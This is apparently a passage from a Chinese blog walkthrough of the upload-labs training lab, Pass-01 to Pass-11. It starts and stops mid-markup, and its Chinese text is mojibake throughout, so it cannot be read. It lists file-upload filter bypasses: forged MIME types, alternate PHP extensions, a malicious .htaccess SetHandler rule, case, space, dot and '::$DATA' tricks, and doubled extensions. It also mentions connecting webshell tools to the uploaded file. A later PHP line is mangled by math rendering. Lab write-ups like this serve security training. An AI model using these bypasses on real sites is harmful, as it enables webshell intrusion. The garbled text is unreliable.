æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span><br><span class=\"line\">    if (allow_ext.indexOf(ext_name) == -1) &#123;</span><br><span class=\"line\">        var errMsg = &quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot; + allow_ext + &quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot; + ext_name;</span><br><span class=\"line\">        alert(errMsg);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ä¸Šä¼ åé€šè¿‡æŸ¥çœ‹å™¨å¾—åˆ°æ–‡ä»¶è·¯å¾„</p>\n<p><img src=\"upload-labs-01-03.png\" alt=\"\"></p>\n<p>ä¸Šèœåˆ€</p>\n<p>èœåˆ€æ²¡ä¸Šå»ï¼Œä¸Šèšå‰‘</p>\n<p><img src=\"upload-labs-01-04.png\" alt=\"\"></p>\n<p><img src=\"upload-labs-01-05.png\" alt=\"\"></p>\n<h2 id=\"æ€»ç»“\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“\">#</a> æ€»ç»“</h2>\n<p>åœ¨æ§å°è¿è¡Œå‡½æ•°çš„æ–¹æ³•ï¼Œæˆ‘è¿˜æ˜¯ä¸€ä¸ªæœˆä¹‹å‰æ‰çŸ¥é“çš„ï¼ˆåˆ«è¯´ deï¼‰ï¼Œæ˜æ˜å¾ˆå®¹æ˜“æƒ³åˆ°æˆ–è€…å°è¯•åˆ°çš„ç‚¹â€¦</p>\n<p>æ„Ÿè§‰è¿˜æ˜¯è¦è„‘æ´å¤§ä¸€ç‚¹ï¼Œå¤šå°è¯•ä¸€äº›</p>\n<h1 id=\"pass-02\"><a class=\"markdownIt-Anchor\" href=\"#pass-02\">#</a> Pass-02</h1>\n<p>dateï¼š2020-11-25 22:01:47</p>\n<h2 id=\"è¿‡ç¨‹-2\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-2\">#</a> è¿‡ç¨‹</h2>\n<p>é€šè¿‡æŸ¥çœ‹å™¨ï¼Œæ‰¾åˆ°å‰ç«¯çš„ onsubmit äº‹ä»¶ï¼Œä½†æ˜¯åˆ é™¤åï¼Œè¿˜æ˜¯åˆ¤å®šæ–‡ä»¶ç±»å‹ä¸æ­£ç¡®</p>\n<p><img src=\"upload-labs-02-01.png\" alt=\"\"></p>\n<p>å¹¶æ²¡æœ‰åœ¨å‰ç«¯çœ‹è§ js ä»£ç ï¼Œåº”è¯¥æ˜¯åå°åˆ¤æ–­äº†</p>\n<p>çœ‹ä¸€ä¸‹æç¤ºï¼šæœ¬ pass åœ¨æœåŠ¡ç«¯å¯¹æ•°æ®åŒ…çš„ MIME è¿›è¡Œæ£€æŸ¥ï¼</p>\n<p>ä¸Šä¼ æ–‡ä»¶ï¼Œbp æŠ“åŒ…ï¼Œæ›´æ”¹ MIME ç±»å‹ä¸º image/pngï¼ŒåŒæ—¶å¾—åˆ°è·¯å¾„</p>\n<p><img src=\"upload-labs-02-02.png\" alt=\"\"></p>\n<p>ä¸Šèšå‰‘è¿æ¥å³å¯ã€‚</p>\n<h2 id=\"æ€»ç»“-2\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-2\">#</a> æ€»ç»“</h2>\n<p>çœŸç™¾åº¦äº†å¥½å¤šæ¬¡äº†ï¼Œæ¯æ¬¡éƒ½å¿˜è®°</p>\n<p>â€œMIME çš„å…¨ç§°æ˜¯ Multipurpose Internet Mail Extensions, å³å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚ è¿™æ˜¯ HTTP åè®®ä¸­ç”¨æ¥å®šä¹‰æ–‡æ¡£æ€§è´¨åŠæ ¼å¼çš„æ ‡å‡†ã€‚</p>\n<table>\n<thead>\n<tr>\n<th>æ–‡ä»¶ç±»å‹</th>\n<th>åç¼€</th>\n<th>æ•°æ®åŒ…ä¸­çš„æ–‡ä»¶ç±»å‹</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬</td>\n<td>.html</td>\n<td>text/html</td>\n</tr>\n<tr>\n<td>xml æ–‡æ¡£</td>\n<td>.xml</td>\n<td>text/xml</td>\n</tr>\n<tr>\n<td>æ™®é€šæ–‡æœ¬æ–‡æ¡£</td>\n<td>.text</td>\n<td>text/plain</td>\n</tr>\n<tr>\n<td>RTF æ–‡æœ¬</td>\n<td>.rtf</td>\n<td>application/rtf</td>\n</tr>\n<tr>\n<td>PDF æ–‡æ¡£</td>\n<td>.pdf</td>\n<td>application/pdf</td>\n</tr>\n<tr>\n<td>Miscrosoft Word æ–‡ä»¶</td>\n<td>.word</td>\n<td>application/msword</td>\n</tr>\n<tr>\n<td>PNG å›¾åƒ</td>\n<td>.png</td>\n<td>image/png</td>\n</tr>\n<tr>\n<td>GIF å›¾å½¢</td>\n<td>.gif</td>\n<td>image/gif</td>\n</tr>\n<tr>\n<td>JPEG å›¾å½¢</td>\n<td>.jpeg,.jpg</td>\n<td>image/jpeg</td>\n</tr>\n<tr>\n<td>ä»»æ„çš„äºŒè¿›åˆ¶æ•°æ®</td>\n<td></td>\n<td>application/octet-stream</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"pass-03\"><a class=\"markdownIt-Anchor\" href=\"#pass-03\">#</a> Pass-03</h1>\n<p>dateï¼š2020-11-25 22:53:30</p>\n<h2 id=\"è¿‡ç¨‹-3\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-3\">#</a> è¿‡ç¨‹</h2>\n<p>ä¸åºŸè¯ç›´æ¥ä¼  php ä¸Šçˆ†ç ´æŠ“åŒ…ï¼Œsend to repeater</p>\n<p><img src=\"upload-labs-02-03.png\" alt=\"\"></p>\n<p>æ ¹æ®ä¸Šä¼  php æ–‡ä»¶åçš„æç¤ºï¼Œéå¸¸æœ‰ç†ç”±è®¤ä¸ºåå°è®¾ç½®äº†åç¼€çš„é»‘åå•</p>\n<p>å¤§å°å†™ç»•è¿‡ï¼Œæ²¡ç»•è¿‡å»ï¼Œç©ºæ ¼ç»•è¿‡å»äº†ä½†æ˜¯ä¸è§£æï¼Œé‚£æ—¢ç„¶æ˜¯é»‘åå•ï¼Œå°±æŠŠåç¼€æ”¹æˆ php4 å‘—</p>\n<p><img src=\"upload-labs-03-01.png\" alt=\"\"></p>\n<p>ä¸Šèšå‰‘è¿æ¥çš„æ—¶å€™ï¼Œè„šæœ¬æ”¹æˆ php4 ç±»å‹çš„å°±å¯ä»¥äº†</p>\n<h2 id=\"æ€»ç»“-3\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-3\">#</a> æ€»ç»“</h2>\n<p>æ®è¯´ï¼Œç©ºæ ¼å¯ä»¥é‚£å•¥ï¼Œwindows ä¼šå¿½ç•¥ç©ºæ ¼å’Œç‚¹ï¼Œå¯æ˜¯æˆ‘ä¸Šä¼ æˆåŠŸä¸èƒ½è§£æ</p>\n<p>ç„¶å 00 æˆªæ–­ä¸Šä¼ ï¼Œå³é”®çœ‹æºä»£ç æ˜¯æˆ‘çš„ä¸€å¥è¯ï¼Œåæ¥æŸ¥äº†ä¸€ä¸‹æˆªæ–­ä¸Šä¼ çš„æ¡ä»¶ï¼š</p>\n<ol>\n<li>php ç‰ˆæœ¬å°äº 5.3.29</li>\n<li>magic_quotes_gpc = Off</li>\n</ol>\n<p>å”‰</p>\n<h1 id=\"pass-04\"><a class=\"markdownIt-Anchor\" href=\"#pass-04\">#</a> Pass-04</h1>\n<p>dateï¼š2020-11-25 23:03:25</p>\n<h2 id=\"è¿‡ç¨‹-4\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-4\">#</a> è¿‡ç¨‹</h2>\n<p>æç¤ºï¼š</p>\n<p>æœ¬ pass ç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf åç¼€æ–‡ä»¶ï¼</p>\n<p>çœ‹äº†ä¸‹æºç ç©ºæ ¼å¤§å°å†™å•¥çš„ï¼Œéƒ½è¢«å¼„äº†</p>\n<p>ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤.htaccess åç¼€</p>\n<p>è¦å¯ç”¨.htaccessï¼Œè¦æ›´æ”¹ httpd.conf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AllowOverride None </span><br><span class=\"line\">æ›´æ”¹ä¸ºï¼šAllowOverride All</span><br></pre></td></tr></table></figure>\n<p><img src=\"upload-labs-04-01.png\" alt=\"\"></p>\n<p>å»æ‰æ¡†ä½è¿™è¡Œçš„æ³¨é‡Šç¬¦å·</p>\n<p><img src=\"upload-labs-04-02.png\" alt=\"\"></p>\n<p>ä¸Šä¼ .htaccessï¼Œæ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè§£æä¸º php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>\n<p>ç„¶åä¸Šä¼  hqxx.png å›¾ç‰‡é©¬</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> phpinfo(); <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>é¢˜ç›®ä¹Ÿç»™äº†è·¯å¾„äº†ï¼Œåœ°å€æ ç›´æ¥è¾“å…¥å°±è¡Œ</p>\n<h2 id=\"æ€»ç»“-4\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-4\">#</a> æ€»ç»“</h2>\n<p>æˆ‘æœ€åä¹Ÿæ²¡æŠŠ.png è§£æ php æˆåŠŸ</p>\n<p>åœ¨.htaccess é‡Œé¢éšä¾¿è¾“é”™è¯¯å­—ç¬¦ï¼ŒæŠ¥ 500ï¼Œå»çœ‹ apache çš„æ—¥å¿—è¯´æˆ‘è¾“å…¥çš„é”™è¯¯å­—ç¬¦ä¸å¯¹ï¼Œè¯´æ˜æˆ‘ä¸Šä¼ çš„.htaccess æ–‡ä»¶æ˜¯è¢«è§£æäº†çš„</p>\n<p>æŠŠ httpd.conf é‡Œé¢æ‰€æœ‰çš„ AllowOverride None éƒ½æ”¹æˆäº† AllowOverride Allï¼Œé‡å†™æ¨¡å—ä¹Ÿå¼€äº†ï¼Œæ–‡ä»¶è·¯å¾„ä¹Ÿæ²¡æœ‰é—®é¢˜ï¼Œphp ç‰ˆæœ¬ä¹Ÿè°ƒä½äº†ï¼Œphpstudy ä¹Ÿé‡å¯äº†ï¼Œä½†æ°¸è¿œå°±æ˜¯è¿™æ ·ï¼š</p>\n<p><img src=\"upload-labs-04-03.png\" alt=\"\"></p>\n<p>æˆ‘è§‰å¾—åº”è¯¥è¿˜æ˜¯é…ç½®æ–‡ä»¶çš„é—®é¢˜ï¼Œå¯æ˜¯åˆ°åº•æ˜¯å“ªé‡Œå‡ºäº†é—®é¢˜å•Šï¼ï¼ï¼</p>\n<p>è€Œåä¿®æ”¹ htaccess ä¸ºï¼ŒæŠŠæ–‡ä»¶ååŒ…å« hqxx çš„æ–‡ä»¶å…¨éƒ¨ä»¥ php è§£æ:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;FilesMatch &quot;hqxx&quot; &gt;</span><br><span class=\"line\">SetHandler application/x-httpd-php</span><br><span class=\"line\">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>\n<p>å‘ç° a.php å¯ä»¥è§£ææˆåŠŸï¼Œè€Œ hqxx.php ä¸èƒ½è§£æï¼Œæˆ‘çœŸçœŸçœŸå‘µå‘µäº†</p>\n<p>æ‰¾äº†å¥½ä¹…ç»ˆäºå‘ç°æœ‰ä¸€ä¸ªäººå’Œæˆ‘ä¸€æ ·çš„é—®é¢˜äº†ï¼Œå“­å”§å”§</p>\n<p><a href=\"https://www.zhaosimeng.cn/zqzb/55.html\">è°¢è°¢å¤§å“¥</a></p>\n<p>åœ¨æ–°ç‰ˆä¸­ php ç¯å¢ƒé»˜è®¤éƒ½æ˜¯å¸¦ nts çš„ï¼Œè€Œåœ¨æ—§ç‰ˆæœ¬ä¸­åˆ™å¯ä»¥é€‰æ‹©ä¸å¸¦ï¼Œé€‰ä¸€ä¸ªä¸å¸¦ nts çš„ php ç‰ˆæœ¬å°±å¯ä»¥æ­£å¸¸ç©äº†ï¼Œä½†æ˜¯æˆ‘çš„ phpstudy é‡Œçš„ php å…¨æ˜¯å¸¦ nts çš„ï¼Œè°¢è°¢æ‚¨äº†</p>\n<ol>\n<li>\n<p><strong>.htaccess ä¸Šä¼ æ¼æ´</strong></p>\n<p>æ¼æ´å½¢æˆæ¡ä»¶</p>\n<ul>\n<li>apache æœåŠ¡å™¨</li>\n<li>èƒ½å¤Ÿä¸Šä¼ .htaccess æ–‡ä»¶ï¼Œä¸€èˆ¬ä¸ºé»‘åå•é™åˆ¶ã€‚</li>\n<li>AllowOverride Allï¼Œé»˜è®¤é…ç½®ä¸ºå…³é—­ Noneã€‚</li>\n<li>LoadModule rewrite_module modules/mod_rewrite.so #æ¨¡å—ä¸ºå¼€å¯çŠ¶æ€</li>\n<li>ä¸Šä¼ ç›®å½•å…·æœ‰å¯æ‰§è¡Œæƒé™ã€‚</li>\n</ul>\n</li>\n<li>\n<p>.htaccess æ–‡ä»¶ (æˆ–è€… &quot;åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶&quot;ï¼‰, å…¨ç§°æ˜¯ Hypertext Access (è¶…æ–‡æœ¬å…¥å£)ã€‚</p>\n<p>æ¦‚è¿°æ¥è¯´ï¼Œhtaccess æ–‡ä»¶æ˜¯<a href=\"https://baike.baidu.com/item/Apache\"> Apache</a> æœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚</p>\n<p>å¯ç”¨.htaccessï¼Œéœ€è¦ä¿®æ”¹ httpd.confï¼Œå¯ç”¨ AllowOverrideï¼Œå¹¶å¯ä»¥ç”¨ AllowOverride é™åˆ¶ç‰¹å®šå‘½ä»¤çš„ä½¿ç”¨ã€‚</p>\n<p>.htaccess çš„ä¸»è¦ä½œç”¨å°±æ˜¯å®ç° url æ”¹å†™ï¼Œä¹Ÿå°±æ˜¯å½“æµè§ˆå™¨é€šè¿‡ url è®¿é—®åˆ°æœåŠ¡å™¨æŸä¸ªæ–‡ä»¶å¤¹æ—¶ï¼Œä½œä¸ºä¸»äººï¼Œæˆ‘ä»¬å¯ä»¥æ¥æ¥å¾…è¿™ä¸ª urlï¼Œå…·ä½“åœ°æ€æ ·æ¥å¾…å®ƒï¼Œå°±æ˜¯æ­¤æ–‡ä»¶çš„ä½œç”¨ã€‚</p>\n<p><a href=\"https://www.cnblogs.com/gyrgyr/p/10773118.html\">.htaccess ä½¿ç”¨æ–¹æ³•ä»‹ç»</a></p>\n</li>\n</ol>\n<h1 id=\"pass-05\"><a class=\"markdownIt-Anchor\" href=\"#pass-05\">#</a> Pass-05</h1>\n<h2 id=\"è¿‡ç¨‹-5\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-5\">#</a> è¿‡ç¨‹</h2>\n<p>çœ‹æºç ï¼Œå·²ç»ä¸è®©ä¸Šä¼ .htaccess äº†ï¼Œä½†æ˜¯è¿™æ¬¡æ²¡æœ‰æŠŠåç¼€åå…¨è½¬æˆå°å†™äº†ï¼Œä¹Ÿå°±æ˜¯è¯´å˜¿å˜¿å˜¿</p>\n<p>ä¸Šä¼  hqxx.phP</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>\n<p>ä¸Šä¼ æˆåŠŸï¼Œåœ°å€æ ç›´æ¥è¾“å…¥è·¯å¾„</p>\n<p><img src=\"upload-labs-05-01.png\" alt=\"\"></p>\n<h2 id=\"æ€»ç»“-5\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-5\">#</a> æ€»ç»“</h2>\n<p>æˆ‘æŠŠ apache ç©å´©äº†ï¼Œé‡è£…éƒ½ä¸è¡Œï¼Œæ¢äº† Nginx å“ˆå“ˆå“ˆ</p>\n<p>é¡ºä¾¿æŸ¥äº†ä¸‹ nginx ç”¨ htaccess çš„æ–¹æ³•ï¼Œ<a href=\"https://blog.csdn.net/cs729298/article/details/77478155\">æƒ³çœ‹ç‚¹æˆ‘</a></p>\n<h1 id=\"pass-06\"><a class=\"markdownIt-Anchor\" href=\"#pass-06\">#</a> Pass-06</h1>\n<h2 id=\"è¿‡ç¨‹-6\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-6\">#</a> è¿‡ç¨‹</h2>\n<p>çœ‹æºç ï¼Œä¾ç„¶æ˜¯é»‘åå•</p>\n<p>å¹¶ä¸”å°†åç¼€åå…¨éƒ¨è½¬æ¢ä¸ºå°å†™äº†ï¼Œä½†æ˜¯ç©ºæ ¼å•¥çš„æ²¡å»é™¤äº†</p>\n<p>åœ¨æ–‡ä»¶åæœ«å°¾åŠ ä¸€ä¸ªç©ºæ ¼ä¸Šä¼ </p>\n<p><img src=\"upload-labs-06-01.png\" alt=\"\"></p>\n<p>è§£ææˆåŠŸ</p>\n<p><img src=\"upload-labs-06-02.png\" alt=\"\"></p>\n<h2 id=\"æ€»ç»“-6\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-6\">#</a> æ€»ç»“</h2>\n<p>åˆ©ç”¨ Windows ç‰¹æ€§ åœ¨ Windows ä¸­æ–‡ä»¶åç¼€åæœ«å°¾æœ‰ç©ºæ ¼ä¼šè‡ªåŠ¨å»æ‰</p>\n<h1 id=\"pass-07\"><a class=\"markdownIt-Anchor\" href=\"#pass-07\">#</a> Pass-07</h1>\n<h2 id=\"è¿‡ç¨‹-7\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-7\">#</a> è¿‡ç¨‹</h2>\n<p>çœ‹æºç ï¼Œè½¬æ¢äº†å¤§å°å†™ï¼Œå»é™¤äº†é¦–ä½ç©ºæ ¼</p>\n<p>é‚£å°±åœ¨æ–‡ä»¶æœ«å°¾åŠ ã€‚å‘—</p>\n<p>ä¸Šä¼ æˆåŠŸï¼Œè§£ææˆåŠŸ</p>\n<p><img src=\"upload-labs-07-01.png\" alt=\"\"></p>\n<h2 id=\"æ€»ç»“-7\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-7\">#</a> æ€»ç»“</h2>\n<p>ä¸‹ä¸€é¢˜</p>\n<h1 id=\"pass-08\"><a class=\"markdownIt-Anchor\" href=\"#pass-08\">#</a> Pass-08</h1>\n<h2 id=\"è¿‡ç¨‹-8\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-8\">#</a> è¿‡ç¨‹</h2>\n<p>ä¸Šä¼  hqxx.php::DATA</p>\n<p><img src=\"upload-labs-08-01.png\" alt=\"\"></p>\n<h2 id=\"æ€»ç»“-8\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-8\">#</a> æ€»ç»“</h2>\n<p>åˆ©ç”¨ windows ç‰¹æ€§ï¼š</p>\n<p>å¿…é¡»æ˜¯ windows, å¿…é¡»æ˜¯ php, å¿…é¡»æ˜¯é‚£ä¸ªæºæ–‡ä»¶<br>\n php åœ¨ window çš„æ—¶å€™å¦‚æœæ–‡ä»¶åååŠ ä¸Š &quot;::$DATA&quot;</p>\n<p>ä¼šæŠŠ &quot;::$DATA&quot; ä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†ï¼Œä¸ä¼šæ£€æµ‹åç¼€å</p>\n<p>ä¸”ä¿æŒ &quot;::$DATA&quot; ä¹‹å‰çš„æ–‡ä»¶å</p>\n<p>ä»–çš„ç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€å</p>\n<p>æ”¹æºä»£ç æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå…¶å®å’Œã€‚ç©ºæ ¼æ˜¯ä¸€æ ·çš„ï¼Œå°±æ˜¯åˆ©ç”¨ windows ç‰¹æ€§ç»•è¿‡é»‘åå•ï¼Œä¸Šä¼ åˆ°æ–‡ä»¶å¤¹æ—¶ï¼Œæ–‡ä»¶åé¢çš„ &quot;::DATAâ€¦&quot; å·²ç»è¢«å»æ‰äº†</p>\n<h1 id=\"pass-09\"><a class=\"markdownIt-Anchor\" href=\"#pass-09\">#</a> Pass-09</h1>\n<h2 id=\"è¿‡ç¨‹-9\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-9\">#</a> è¿‡ç¨‹</h2>\n<p>çœ‹æç¤ºï¼šæœ¬ pass åªå…è®¸ä¸Šä¼ .jpg|.png|.gif åç¼€çš„æ–‡ä»¶ï¼</p>\n<p>çœ‹äº†æºç å‘ç°ï¼Œä½ è¿™ä¸ªéª—å­ï¼Œæ˜æ˜è¿˜æ˜¯é»‘åå•ï¼Œä¸‹æ¬¡ä¸çœ‹æç¤ºäº†</p>\n<p>çœ‹æºç ï¼šå…ˆåˆ é™¤äº†æœ«å°¾çš„ç‚¹ï¼Œç„¶åå»æ‰äº†::$DATAï¼Œåç¼€è½¬æˆäº†å°å†™ï¼Œæœ€åå»é™¤é¦–å°¾ç©ºæ ¼</p>\n<p>é‚£å°± hqxx.php. .</p>\n<p>è¿™æ ·æœ€ååœ¨æœ«å°¾å°±ç•™ä¸‹äº†ä¸€ä¸ªç‚¹ï¼Œä¸Šä¼ æˆåŠŸ</p>\n<p><img src=\"upload-labs-09-01.png\" alt=\"\"></p>\n<h2 id=\"æ€»ç»“-9\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-9\">#</a> æ€»ç»“</h2>\n<p>è·Ÿç€ä»£ç é€»è¾‘èµ°ï½ï¼Œå¯æ˜¯é»‘ç›’éƒ½çœ‹ä¸åˆ°æºä»£ç å”‰</p>\n<h1 id=\"pass-10\"><a class=\"markdownIt-Anchor\" href=\"#pass-10\">#</a> Pass-10</h1>\n<h2 id=\"è¿‡ç¨‹-10\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-10\">#</a> è¿‡ç¨‹</h2>\n<p>å“ˆå“ˆå“ˆï¼Œæºä»£ç æ³¨é‡Šæ²¡äº†</p>\n<p>å…ˆå»é™¤æ–‡ä»¶åä¸­çš„æ‰€æœ‰ç©ºæ ¼ï¼Œå†æŠŠæ–‡ä»¶åä¸­æ‰€æœ‰åœ¨é»‘åå•ä¸­å­˜åœ¨çš„å­—ç¬¦ç½®ç©º</p>\n<p>é‚£ä¹ˆå°±ï¼ŒåŒå†™ï¼ŒæˆåŠŸç»•è¿‡</p>\n<p><img src=\"upload-labs-10-01.png\" alt=\"\"></p>\n<h2 id=\"æ€»ç»“-10\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-10\">#</a> æ€»ç»“</h2>\n<p>ä¸‹ä¸€é¢˜</p>\n<h1 id=\"pass-11\"><a class=\"markdownIt-Anchor\" href=\"#pass-11\">#</a> Pass-11</h1>\n<h2 id=\"è¿‡ç¨‹-11\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-11\">#</a> è¿‡ç¨‹</h2>\n<p>è§‚æ‘©æºä»£ç ï¼Œå‘ç°æ˜¯ç™½åå•ï¼Œå…è®¸çš„ç±»å‹æœ‰â€™jpgâ€™,â€˜pngâ€™,â€˜gifâ€™ï¼Œè€Œä¸”è¿˜ç»™æ–‡ä»¶é‡å‘½åäº†</p>\n<p>ä¸Šä¼  php æŠ“åŒ…å‘ç° save_path=â€¦/upload</p>\n<p>æºç ä¸­æ–‡ä»¶ä¿å­˜è·¯å¾„å°±æ˜¯ $img_path = <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">â€²</mo></msup><mi>s</mi><mi>a</mi><mi>v</mi><msub><mi>e</mi><mi>p</mi></msub><mi>a</mi><mi>t</mi><msup><mi>h</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">â€²</mo></msup><mo stretchy=\"false\">]</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">&quot;</mi><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">&quot;</mi><mi mathvariant=\"normal\">.</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>d</mi><mo stretchy=\"false\">(</mo><mn>10</mn><mo separator=\"true\">,</mo><mn>99</mn><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">.</mi><mi>d</mi><mi>a</mi><mi>t</mi><mi>e</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">&quot;</mi><mi>Y</mi><mi>m</mi><mi>d</mi><mi>H</mi><mi>i</mi><mi>s</mi><mi mathvariant=\"normal\">&quot;</mi><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">&quot;</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">&quot;</mi><mi mathvariant=\"normal\">.</mi></mrow><annotation encoding=\"application/x-tex\">_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.038em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">G</span></span></span></span><span class=\"vlist-s\">â€‹</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">â€²</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139200000000003em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">p</span></span></span></span><span class=\"vlist-s\">â€‹</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">â€²</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord\">.</span><span class=\"mord\">&quot;</span><span class=\"mord\">/</span><span class=\"mord\">&quot;</span><span class=\"mord\">.</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">d</span><span class=\"mopen\">(</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mclose\">)</span><span class=\"mord\">.</span><span class=\"mord mathnormal\">d</span><span class=\"mord 